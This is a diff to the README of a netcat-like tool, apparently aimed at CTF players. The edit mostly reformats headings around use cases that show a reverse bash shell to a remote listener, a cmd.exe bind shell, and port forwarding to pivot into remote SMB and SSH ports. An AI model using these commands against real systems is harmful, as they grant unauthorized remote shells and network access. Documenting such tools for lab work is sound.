@@ -36,18 +36,16 @@ The simplest examples are the classic netcat connect and listen functions. You c
 ![Listener & connect example image](assets/basic.gif)
 
 ## CTF Use Cases
-
 Some really common use cases I have are:
-
-Start an interactive Bash shell and connect back to a remote listener:
+### Start an interactive Bash shell and connect back to a remote listener:
 ```
 # Start a listener on your remote machine
 ❯ ng -l 1234
 # Start the shell
 ❯ ng -c remote_host:1234 -e '/bin/bash -i'
 ```
-
-Or start the same shell on a bind listener; this is useful because you can create as many conenctions as you like - if your shell drops, just re-connect.
+### Start the same shell on a bind listener.
+This is useful in certail cases because you can create as many conenctions as you like - if your shell drops, just re-connect.
 ```
 ❯ ng -l 1234 -e 'cmd.exe'
 # Now connect up to the shell
@@ -59,8 +57,7 @@ C:\Windowss\system32>
 C:\Windowss\system32>
 
 ```
-
-Forward a TCP port back to a remote listener:
+### Forward a TCP port back to a remote listener:
 ```
 # Start a relay on your local host
 ❯ ng -l 1234 -l 445
@@ -68,13 +65,10 @@ Forward a TCP port back to a remote listener:
 ❯ ng -c remote_host:1234 -c 127.0.0.1:445
 # Your local machine now has access to that remote port 445 on 127.0.0.1:445
 ```
-
-Port 'spoofing' - Forward incoming connections to local port:
+# Port 'spoofing' - Forward incoming connections to local port:
 ```
 # Listen on port 1234 and forward connections to ssh server
 ❯ ng -l 1234 -c 127.0.0.1:22
 ```
-
 # Feedback?
-
 Issues, pulls, emails, tweets all welcome!
